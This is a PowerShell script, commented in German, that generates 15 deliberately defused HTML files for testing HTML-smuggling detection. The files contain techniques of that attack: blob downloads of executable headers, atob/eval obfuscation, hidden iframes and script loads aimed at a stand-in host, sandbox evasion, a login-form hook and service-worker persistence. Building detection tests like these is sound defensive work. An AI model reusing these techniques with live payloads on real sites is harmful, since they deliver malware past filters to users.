# create_all_test_files_safe.ps1
# Erstellt 15 HTML-Testdateien (entschaerft) zum Testen von Filtern/Detektion
# Fokus: Trigger fuer HTML Smuggling Heuristiken ohne Phishing/Exfil/echte Malware
# Ausgabe: UTF-8 ohne BOM, literal Here-Strings, optional -Force

param(
  [switch]$Force
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║   Erstelle 15 HTML Testdateien (SAFE) fuer Filtertests     ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

$testFolder = "HTML_Testfiles_Complete_SAFE"
if (!(Test-Path -LiteralPath $testFolder)) {
  New-Item -ItemType Directory -Path $testFolder | Out-Null
}

Push-Location $testFolder

function Convert-ContentWithHex {
  param([string]$content)

  return [regex]::Replace($content, '\\x([0-9a-fA-F]{2})', {
    param([System.Text.RegularExpressions.Match]$m)
    $hexValue = [Convert]::ToByte($m.Groups[1].Value, 16)

    switch ($hexValue) {
      0  { return "`0" }
      9  { return "`t" }
      10 { return "`n" }
      13 { return "`r" }
      default { return [char]$hexValue }
    }
  })
}

# Domains fuer Tests: reserviert, nicht aufloesbar oder ohne echte Wirkung
# example.invalid ist garantiert ungueltig (RFC 2606 / IANA reserved)
$dummyDomain = "example.invalid"

$testFiles = @(
  @{
    Name = "test1_blob_download.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 1 Blob Download SAFE</title></head>
<body>
<script>
  // Blob Download Trigger (harmloser Inhalt)
  function run() {
    var data = "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00";
    var blob = new Blob([data], {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'invoice.bin';
    document.body.appendChild(a);
    a.click();
    URL.revokeObjectURL(url);
  }
  window.onload = run;
</script>
<h1>Test 1</h1>
</body>
</html>
'@
  }

  @{
    Name = "test2_obfuscated_js.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 2 Obfuscated JS SAFE</title></head>
<body>
<script>
  // Obfuscation Trigger ohne echte External Calls
  var _0x4b8a = ['atob','createObjectURL','Blob','log'];
  var encoded = "aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvcGF5bG9hZC5iaW4="; // https://example.invalid/payload.bin
  var decoded = window[_0x4b8a[0]](encoded);
  console[_0x4b8a[3]]("decoded url:", decoded);

  var b = new window[_0x4b8a[2]]([decoded], {type:'text/plain'});
  var u = URL[_0x4b8a[1]](b);
  console.log("blob url:", u);
</script>
</body>
</html>
'@
  }

  @{
    Name = "test3_iframe_driveby.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 3 Iframe Driveby SAFE</title></head>
<body>
<iframe id="hiddenFrame" style="display:none"></iframe>
<img src="tracking.png" style="display:none" onload="start()">
<script>
  function start() {
    // Iframe src Trigger (zeigt auf reserved domain)
    var f = document.getElementById('hiddenFrame');
    f.src = "https://example.invalid/update.bin";

    // Meta refresh Trigger mit data URI
    var meta = document.createElement('meta');
    meta.httpEquiv = 'refresh';
    meta.content = '0;url=data:application/octet-stream;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA';
    document.head.appendChild(meta);
  }

  // eval atob Trigger (harmloser Code)
  var payload = "console.log('eval atob trigger')";
  var evilCode = "eval(atob('" + btoa(payload) + "'))";
  setTimeout(evilCode, 500);
</script>
</body>
</html>
'@
  }

  @{
    Name = "test4_magic_bytes.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 4 Magic Bytes SAFE</title></head>
<body>
<script>
  // Magic byte Trigger: PDF, EXE, ZIP Patterns im String (harmlos)
  var pdfData = "%PDF-1.4\n%âãÏÓ\n1 0 obj\n<< /Type /Catalog >>\nendobj";
  var exeData = "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00";
  var zipData = "PK\x03\x04\x14\x00\x00\x00\x00\x00";

  var pdfBlob = new Blob([pdfData], {type:'application/pdf'});
  var exeBlob = new Blob([exeData], {type:'application/octet-stream'});
  var zipBlob = new Blob([zipData], {type:'application/zip'});

  console.log(URL.createObjectURL(pdfBlob));
  console.log(URL.createObjectURL(exeBlob));
  console.log(URL.createObjectURL(zipBlob));
</script>
</body>
</html>
'@
  }

  @{
    Name = "test5_workers.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 5 Web Worker SAFE</title></head>
<body>
<script>
  var workerCode = `
    self.onmessage = function(e) {
      var blob = new Blob(['MZ'], {type:'application/octet-stream'});
      var url = URL.createObjectURL(blob);
      self.postMessage({url:url});
    }
  `;
  var b = new Blob([workerCode], {type:'application/javascript'});
  var u = URL.createObjectURL(b);
  var w = new Worker(u);

  w.onmessage = function(e) {
    var a = document.createElement('a');
    a.href = e.data.url;
    a.download = 'worker_payload.bin';
    a.click();
  };

  w.postMessage({cmd:'start'});
</script>
</body>
</html>
'@
  }

  @{
    Name = "test6_appinstaller_schema.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 6 ms-appinstaller Schema SAFE</title></head>
<body>
<script>
  // Schema Trigger ohne echten Aufruf
  var s = "ms-appinstaller:?source=https://example.invalid/fake.appinstaller";
  console.log("schema:", s);

  // AppInstaller XML Trigger als Blob
  var xml = '<?xml version="1.0" encoding="UTF-8"?><AppInstaller Uri="https://example.invalid/app.msix" Version="1.0.0.0" />';
  var b = new Blob([xml], {type:'application/xml'});
  console.log(URL.createObjectURL(b));
</script>
</body>
</html>
'@
  }

  @{
    Name = "test7_anti_analysis.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 7 Anti Analysis SAFE</title></head>
<body>
<script>
  function isSandboxed() {
    if (window.innerWidth < 1024 || window.innerHeight < 768) return true;
    var start = Date.now();
    for (var i=0;i<200000;i++) Math.random();
    var delta = Date.now() - start;
    if (delta < 5) return true;
    if (navigator.webdriver) return true;
    return false;
  }

  if (!isSandboxed()) {
    var payload = 'console.log("anti analysis passed")';
    eval(payload);
  } else {
    document.body.innerHTML = "<h1>Test 7</h1><p>Sandbox heuristics triggered</p>";
  }
</script>
</body>
</html>
'@
  }

  @{
    Name = "test8_dom_manipulation.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 8 DOM Manipulation SAFE</title></head>
<body>
<form id="loginForm" action="/login" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit" value="Login">
</form>

<script>
  // Form Hook Trigger ohne Datenabfluss
  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var u = document.querySelector('input[name="username"]').value;
    console.log("captured username:", u);

    var blob = new Blob(['MZ'], {type:'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    console.log("blob url:", url);
  });

  // EventTarget Hook Trigger
  var originalAdd = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function(type, listener, options) {
    if (type === 'click' && String(listener).includes('download')) {
      var wrapper = function(e) {
        console.log("click wrapped");
        return listener.call(this, e);
      };
      return originalAdd.call(this, type, wrapper, options);
    }
    return originalAdd.call(this, type, listener, options);
  };
</script>
</body>
</html>
'@
  }

  @{
    Name = "test9_unicode_smuggling.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 9 Unicode Smuggling SAFE</title></head>
<body>
<script>
  // Zero-width Zeichen Trigger (sichtbar im Source)
  var hidden_chars = "a​t​o​b";

  function d​o​w​n​l​o​a​d() {
    var d​a​t​a = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA";
    var c​l​e​a​n = d​a​t​a.replace(/[​]/g, '');
    var r​e​a​l = window['a​t​o​b'](c​l​e​a​n);
    console.log("decoded length:", r​e​a​l.length);
  }

  setTimeout(d​o​w​n​l​o​a​d, 200);
</script>
</body>
</html>
'@
  }

  @{
    Name = "test10_all_in_one.html"
    Content = @'
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Test 10 All in One SAFE</title>
  <meta http-equiv="refresh" content="3;url=data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygnbWV0YSByZWZyZXNoIHRyaWdnZXInKTwvc2NyaXB0Pg==">
</head>
<body>
<svg onload="init()" style="display:none">
  <script>window.stage1 = true;</script>
</svg>

<script>
  function init() {
    if (window.innerWidth < 800) return;

    var _0x = ['exe','dll','pdf'];
    var exten = _0x[0].split('').reverse().join(''); // exe -> exe

    var w = new Worker(URL.createObjectURL(new Blob([`
      self.onmessage = function(e) {
        var data = atob(e.data);
        postMessage(data);
      }
    `], {type:'application/javascript'})));

    w.onmessage = function(e) {
      var blob = new Blob([e.data], {type:'application/octet-stream'});
      var url = URL.createObjectURL(blob);
      var a = document.createElement('a');
      a.href = url;
      a.download = 'update.' + exten;
      a.click();
    };

    document.body.style.setProperty('--data', 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA');
    w.postMessage(getComputedStyle(document.body).getPropertyValue('--data').trim());

    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://example.invalid/beacon.html';
    document.body.appendChild(iframe);
  }
</script>
<div style="display:none">​a​t​o​b​(​)​</div>
</body>
</html>
'@
  }

  @{
    Name = "test11_external_resource_loader.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 11 External Resources SAFE</title></head>
<body>
<script>
  // Externe Ressourcen Trigger, aber auf reserved domain
  var s1 = document.createElement('script');
  s1.src = 'https://example.invalid/stage1.js';
  document.head.appendChild(s1);

  var link = document.createElement('link');
  link.rel = 'stylesheet';
  link.href = 'https://example.invalid/style.css';
  document.head.appendChild(link);

  var img = new Image();
  img.src = 'https://example.invalid/track.png?ref=' + btoa(navigator.userAgent);
</script>

<iframe src="https://example.invalid/beacon.html" style="display:none"></iframe>
<iframe srcdoc="<script>console.log('srcdoc trigger')</script>" style="display:none"></iframe>
</body>
</html>
'@
  }

  @{
    Name = "test12_webcrypto_aes_payload.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 12 WebCrypto SAFE</title></head>
<body>
<script>
  // WebCrypto Trigger (ohne echte Payload)
  const encryptedPayload = new Uint8Array(32);
  const keyData = new Uint8Array(32);
  const iv = new Uint8Array(16);

  async function run() {
    try {
      const key = await crypto.subtle.importKey('raw', keyData, { name:'AES-CBC' }, false, ['decrypt']);
      try {
        await crypto.subtle.decrypt({ name:'AES-CBC', iv:iv }, key, encryptedPayload);
      } catch (e) {
        console.log("decrypt failed as expected");
      }

      const highEntropy = new Uint8Array(1024);
      crypto.getRandomValues(highEntropy);
      const hashBuffer = await crypto.subtle.digest('SHA-256', highEntropy);
      console.log("hash len:", new Uint8Array(hashBuffer).length);
    } catch (e) {
      console.log("crypto error", e);
    }
  }

  run();
</script>
</body>
</html>
'@
  }

  @{
    Name = "test13_qr_html_hybrid.html"
    Content = @'
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Test 13 QR Hybrid SAFE</title>
  <style>
    .qr-container { position: fixed; inset: 0; background: #f3f3f3; }
    .qr-box { width: 420px; margin: 60px auto; background: #fff; padding: 16px; border: 1px solid #ddd; }
    canvas { width: 300px; height: 300px; }
    .hidden-payload { display:none; }
    .stealth-data { --payload: 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA'; }
  </style>
</head>
<body>
  <div class="qr-container">
    <div class="qr-box">
      <h2>QR Test</h2>
      <canvas id="qrCanvas"></canvas>
      <p>Click Trigger</p>
    </div>
  </div>

  <div class="stealth-data"></div>

<script>
  function draw() {
    const c = document.getElementById('qrCanvas');
    const ctx = c.getContext('2d');
    const qr = [
      [1,1,1,1,1,1,1,0,1],
      [1,0,0,0,0,0,1,0,1],
      [1,0,1,1,1,0,1,0,1],
      [1,0,1,1,1,0,1,0,1],
      [1,0,0,0,0,0,1,0,1],
      [1,1,1,1,1,1,1,0,1]
    ];
    const s = 30;
    c.width = qr[0].length * s;
    c.height = qr.length * s;

    for (let y=0;y<qr.length;y++) {
      for (let x=0;x<qr[y].length;x++) {
        ctx.fillStyle = qr[y][x] ? 'black' : 'white';
        ctx.fillRect(x*s, y*s, s-1, s-1);
      }
    }

    c.addEventListener('click', function() {
      const payload = getComputedStyle(document.querySelector('.stealth-data')).getPropertyValue('--payload').trim();
      const decoded = atob(payload);
      const b = new Blob([decoded], {type:'application/octet-stream'});
      console.log("qr decoded len:", decoded.length, URL.createObjectURL(b));
    });
  }
  draw();
</script>
</body>
</html>
'@
  }

  @{
    Name = "test14_service_worker_persistence.html"
    Content = @'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Test 14 Service Worker SAFE</title></head>
<body>
<h1>Service Worker Test</h1>
<script>
  // Service Worker Trigger (ohne Beacon/Exfil)
  if ('serviceWorker' in navigator) {
    const swCode = `
      const CACHE_NAME = 'test-cache-v1';
      self.addEventListener('install', event => {
        event.waitUntil(caches.open(CACHE_NAME).then(c => c.put('/offline.html', new Response('offline'))));
        self.skipWaiting();
      });
      self.addEventListener('activate', event => event.waitUntil(clients.claim()));
      self.addEventListener('fetch', event => {
        event.respondWith(
          caches.match(event.request).then(r => r || fetch(event.request).catch(() => caches.match('/offline.html')))
        );
      });
    `;
    const blob = new Blob([swCode], {type:'application/javascript'});
    const url = URL.createObjectURL(blob);
    navigator.serviceWorker.register(url, { scope:'./' })
      .then(r => console.log('sw registered', r.scope))
      .catch(e => console.log('sw failed', e));
  } else {
    console.log('no sw support');
  }

  // Cache API Trigger
  if ('caches' in window) {
    caches.open('payload-cache').then(cache => {
      cache.put('payload.bin', new Response('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'));
    });
  }
</script>
</body>
</html>
'@
  }

  @{
    Name = "test15_ui_lure_neutral.html"
    Content = @'
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Test 15 UI Lure NEUTRAL</title>
  <style>
    body { font-family: Segoe UI, Arial, sans-serif; background: #f6f7fb; margin: 0; height: 100vh; display:flex; align-items:center; justify-content:center; }
    .card { width: 420px; background: white; border: 1px solid #e5e5e5; border-radius: 8px; padding: 24px; }
    .code { font-family: ui-monospace, Consolas, monospace; font-size: 28px; letter-spacing: 6px; padding: 12px; background: #f3f3f3; border: 1px dashed #999; border-radius: 8px; text-align:center; }
    .btn { width: 100%; padding: 12px; margin-top: 16px; border: 0; border-radius: 6px; background: #0078d4; color: white; cursor:pointer; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Test 15</h2>
    <p>UI Trigger fuer Brand Lookalike Tests, ohne Login, ohne Tokens.</p>
    <div class="code" id="code">X7Y9Z3K4</div>
    <button class="btn" onclick="run()">Simulieren</button>
    <p id="out" style="margin-top:16px;color:#444"></p>
  </div>

<script>
  function gen() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let c = '';
    for (let i=0;i<8;i++) c += chars[Math.floor(Math.random()*chars.length)];
    return c;
  }

  function run() {
    const code = gen();
    document.getElementById('code').textContent = code;

    // Nur lokale Simulation
    const info = {
      type: 'ui_lure_simulation',
      code: code,
      ts: Date.now()
    };
    document.getElementById('out').textContent = 'Simuliert: ' + JSON.stringify(info);

    // Optional Trigger: Blob download (harmlos)
    const blob = new Blob(['MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'], {type:'application/octet-stream'});
    const url = URL.createObjectURL(blob);
    console.log('blob url:', url);
  }
</script>
</body>
</html>
'@
  }
)

$successCount = 0
$errorCount = 0

foreach ($file in $testFiles) {
  try {
    $path = Join-Path (Get-Location) $file.Name

    if (Test-Path -LiteralPath $path) {
      if (-not $Force) {
        Write-Host "Existiert bereits: $($file.Name) (nutze -Force zum Ueberschreiben)" -ForegroundColor Yellow
        continue
      }
    }

    $processedContent = Convert-ContentWithHex -content ([string]$file.Content)

    [System.IO.File]::WriteAllText(
      $path,
      $processedContent,
      [System.Text.UTF8Encoding]::new($false)
    )

    Write-Host "Erstellt: $($file.Name)" -ForegroundColor Green
    $successCount++
  }
  catch {
    Write-Host "Fehler bei $($file.Name): $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
    $errorCount++
  }
}

Pop-Location

Write-Host ""
Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    ZUSAMMENFASSUNG                        ║" -ForegroundColor Cyan
Write-Host "╠════════════════════════════════════════════════════════════╣ " -ForegroundColor Cyan
Write-Host "║  Ordner: $testFolder" -ForegroundColor White
Write-Host "║  Erfolgreich: $successCount von $($testFiles.Count)" -ForegroundColor Green
if ($errorCount -gt 0) {
  Write-Host "║  Fehler: $errorCount" -ForegroundColor Red
}
Write-Host "║  Pfad: $((Get-Location).Path)\$testFolder" -ForegroundColor Yellow
Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
